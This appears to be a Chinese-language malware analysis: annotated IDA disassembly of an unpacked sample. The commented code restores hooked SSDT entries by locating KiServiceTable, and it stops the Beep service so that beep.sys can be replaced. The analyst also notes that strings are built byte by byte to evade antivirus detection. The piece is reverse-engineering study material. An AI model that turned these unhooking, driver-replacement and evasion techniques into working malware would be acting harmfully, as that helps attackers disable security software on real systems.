
unpacked:0040143B loc_40143B: ; CODE XREF: ReSSDT+6Ej

```
unpacked:0040143B             mov eax, [ebp+hMem]

unpacked:0040143E             push 1            ; dwFlags

unpacked:00401440             push ebx          ; hFile

unpacked:00401441             mov ecx, [eax+0Ch]

unpacked:00401444             mov [ebp+var_14], ecx

unpacked:00401447             movzx ecx, word ptr [eax+1Eh]

unpacked:0040144B             lea eax, [ecx+eax+20h]

unpacked:0040144F             push eax          ; lpLibFileName

unpacked:00401450             call LoadLibraryExA

unpacked:00401456             mov edi, eax

unpacked:00401458             cmp edi, ebx

unpacked:0040145A             jnz short loc_401466

unpacked:0040145C             push offset aHkernelNull_ ; "hKernel Null ."

unpacked:00401461             jmp loc_4014F3

unpacked:00401466 ; ---------------------------------------------------------------------------

unpacked:00401466

unpacked:00401466 loc_401466:             ; CODE XREF: ReSSDT+99j

unpacked:00401466             push [ebp+hMem]    ; hMem

unpacked:00401469             call GlobalFree

unpacked:0040146F             push offset aKeservicedescr ; "KeServiceDescriptorTable"

unpacked:00401474             push edi          ; hModule

unpacked:00401475             call esi ; GetProcAddress

unpacked:00401477             cmp eax, ebx

unpacked:00401479             jnz short loc_401482

unpacked:0040147B             push offset aGetKeservicede ; "Get KeServiceDescriptorTable addr falie"...

unpacked:00401480             jmp short loc_4014F3

unpacked:00401482 ; ---------------------------------------------------------------------------

unpacked:00401482

unpacked:00401482 loc_401482:             ; CODE XREF: ReSSDT+B8j

unpacked:00401482             sub eax, edi

unpacked:00401484             push eax

unpacked:00401485             push edi

unpacked:00401486             call FindKiServiceTable ; 这个函数看起来乱七八糟的,不知道在干什么,不过从交叉参考处的

unpacked:00401486                         ; 注释会马上发现它是在找 KiServiceTable 的地址.而且是通过返回值

unpacked:00401486                         ; 来传递 KiServiceTable 地址.

unpacked:0040148B             mov esi, eax

unpacked:0040148D             pop ecx

unpacked:0040148E             cmp esi, ebx

unpacked:00401490             pop ecx

unpacked:00401491             jnz short loc_40149A

unpacked:00401493             push offset aFindkiservicet ; "FindKiServiceTable falied."

unpacked:00401498             jmp short loc_4014F3

unpacked:0040149A ; ---------------------------------------------------------------------------

unpacked:0040149A

unpacked:0040149A loc_40149A:             ; CODE XREF: ReSSDT+D0j

unpacked:0040149A             lea eax, [ebp+var_1C]

unpacked:0040149D             push eax

unpacked:0040149E             lea eax, [ebp+var_10]

unpacked:004014A1             push eax

unpacked:004014A2             lea eax, [ebp+var_20]

unpacked:004014A5             push eax

unpacked:004014A6             push edi

unpacked:004014A7             call Get_PE_Headers ; 得到 PE 驱动文件的 PE 头及区段表的相关信息.

unpacked:004014AC             add esp, 10h

unpacked:004014AF             add esi, edi

unpacked:004014B1

unpacked:004014B1 loc_4014B1:             ; CODE XREF: ReSSDT+122j

unpacked:004014B1             mov edx, [ebp+var_10]

unpacked:004014B4             mov ecx, [esi]

unpacked:004014B6             mov ebx, ecx

unpacked:004014B8             sub ebx, [edx+1Ch]

unpacked:004014BB             lea eax, [edx+1Ch]

unpacked:004014BE             cmp ebx, [edx+38h]

unpacked:004014C1             jnb short loc_4014E5

unpacked:004014C3             sub ecx, [eax]

unpacked:004014C5             lea eax, [ebp+BytesReturned]

unpacked:004014C8             push eax          ; LPVOID

unpacked:004014C9             push dword ptr [ebp+InBuffer] ; char

unpacked:004014CC             add ecx, [ebp+var_14]

unpacked:004014CF             push [ebp+hDevice] ; hDevice

unpacked:004014D2             mov [ebp+BytesReturned], ecx

unpacked:004014D5             call ResetServiceAddr ; 这个用于对某一个被 HOOK 了的服务函数进行恢复的.

unpacked:004014DA             add esp, 0Ch

unpacked:004014DD             add esi, 4

unpacked:004014E0             inc dword ptr [ebp+InBuffer]

unpacked:004014E3             jmp short loc_4014B1

unpacked:004014E5 ; ---------------------------------------------------------------------------

unpacked:004014E5

unpacked:004014E5 loc_404014E5:             ; CODE XREF: ReSSDT+100j

unpacked:004014E5             push edi          ; hLibModule

unpacked:004014E6             call FreeLibrary

unpacked:004014EC             jmp short loc_4014F9

unpacked:004014EE ; ---------------------------------------------------------------------------

unpacked:004014EE

unpacked:004014EE loc_4014EE:             ; CODE XREF: ReSSDT+4Fj

unpacked:004014EE             push offset aRcStatus_info_ ; "rc!=STATUS_INFO_LENGTH_MISMATCH."

unpacked:004014F3

unpacked:004014F3 loc_4014F3:             ; CODE XREF: ReSSDT+38j

unpacked:004014F3                         ; ReSSDT+75j ReSSDT+A0j

unpacked:004014F3                         ; ReSSDT+BFj ReSSDT+D7j

unpacked:004014F3             call OutputDebugStringA

unpacked:004014F9

unpacked:004014F9 loc_4014F9:             ; CODE XREF: ReSSDT+12Bj

unpacked:004014F9             pop edi

unpacked:004014FA             pop esi

unpacked:004014FB             pop ebx

unpacked:004014FC             leave

unpacked:004014FD             retn

unpacked:004014FD ReSSDT      endp
```

// 我们来看下加载驱动的部分. (作者使用的是被用烂了的驱动替换)

```
unpacked:004016F7             push ebp

unpacked:004016F8             mov ebp, esp

unpacked:004016FA             sub esp, 138h

unpacked:00401700             and byte_404B80, 0

unpacked:00401707             and [ebp+var_23], 0

unpacked:0040170B             push esi

unpacked:0040170C             push edi

unpacked:0040170D             push offset ServiceName ; lpServiceName

unpacked:00401712             mov ServiceName, 42h

unpacked:00401719             mov byte_404B7D, 65h

unpacked:00401720             mov byte_404B7E, 65h

unpacked:00401727             mov byte_404B7F, 70h ; 这里是"Beep"

unpacked:0040172E             mov [ebp+var_34], 5Ch

unpacked:00401732             mov [ebp+var_33], 44h

unpacked:00401736             mov [ebp+var_32], 72h

unpacked:0040173A             mov [ebp+var_31], 69h

unpacked:0040173E             mov [ebp+var_30], 76h

unpacked:00401742             mov [ebp+var_2F], 65h

unpacked:00401746             mov [ebp+var_2E], 72h

unpacked:0040174A             mov [ebp+var_2D], 73h

unpacked:0040174E             mov [ebp+var_2C], 5Ch ; 这些 mov 其实是赋值字符串.这里是 Drivers\\beep.sys,

unpacked:0040174E                         ; 显然为臭名昭著的驱动替换.这样在代码中赋值字符串

unpacked:0040174E                         ; 可以起到一定得免杀作用.

unpacked:0040174E                         ;

unpacked:00401752             mov [ebp+var_2B], 62h

unpacked:00401756             mov [ebp+var_2A], 65h

unpacked:0040175A             mov [ebp+var_29], 65h

unpacked:0040175E             mov [ebp+var_28], 70h

unpacked:00401762             mov [ebp+var_27], 2Eh

unpacked:00401766             mov [ebp+var_26], 73h

unpacked:0040176A             mov [ebp+var_25], 79h

unpacked:0040176E             mov [ebp+var_24], 73h

unpacked:00401772             call StopService  ; 停止原来的系统服务, 因为要进行肮脏的驱动替换.

unpacked:00401777             test al, al

unpacked:00401779             pop ecx

unpacked:0040177A             jnz short loc_40178F
```
